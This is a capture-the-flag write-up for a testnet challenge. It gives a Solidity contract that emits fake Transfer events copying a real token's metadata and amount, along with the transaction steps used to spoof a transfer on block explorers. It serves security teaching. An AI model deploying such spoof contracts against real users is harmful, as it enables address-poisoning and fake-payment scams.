# Red Spoofing 2 🔀 - 200 Points

Despite your demo in the previous challenge, the client remains unconvinced that their token could be susceptible to a spoofing attack.

They argue that any attempt at a zero-value token transfer would simply revert on their soon-to-be-deployed token, due to on-chain validations. So it'd be impossible for attackers to mimic a legitimate transaction.

However, there’s ONE detail the client might be overlooking: an attacker could create a different contract, with the same symbol, name, and some events, replicating the appearance of an authentic transfer with the same amount on block explorers!

## Task

Remember that the original token transfer is:

`holesky-0x28e46dc92cd9a2df7776138d4a722ed474309569181e25465d2005a7090097a2`

Produce a transaction that executes your contract, which must mimic the token metadata (name & symbol), transferred amount and event of the transfer of the original token.

Note: for this challenge you'll need Holesky ETH to pay for the gas of your transaction.

## Flag

Once you've successfully executed the spoof token transfer in Holesky testnet, follow the instructions on this page to retrieve the flag:

https://therektgames-containers.vercel.app/redspoofing-3

# @Audit

### Step 1: Create .sol contract with all `functions` and `event`:

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract StableSpoof {
    address public immutable OWNER = msg.sender;
    string public name = "StableSpoof";
    string public symbol = "SPOOF";
    uint256 public decimals = 18;
    address owner = 0x31337357A04758b6EA1870Cef0880F20205ad523;

    event Transfer(address indexed from, address indexed to, uint256 amount);

    function transfer(address to, uint256 value) public returns (bool) {
        emit Transfer(owner, to, value);
        return true;
    }
}

```

tx: https://holesky.etherscan.io/tx/0x47f7ed6ed05cd469e2f3b1bba4788f445e6c961e6416cc58948cf0bb14ba44d9

### Step 2: Send a tx:

Function: transfer(address to,uint256 amount)
. Name Type Data
0 to address 0x7d2f41720FCdaC9b4d398Dc59BA1389e3Aa66023
1 amount uint256 1000000000000000000

[Solution] - - tx: https://holesky.etherscan.io/tx/0x461060c55c8e107dc2577c16180597534c3a9be19ea8bb4564538070e3e1cd07
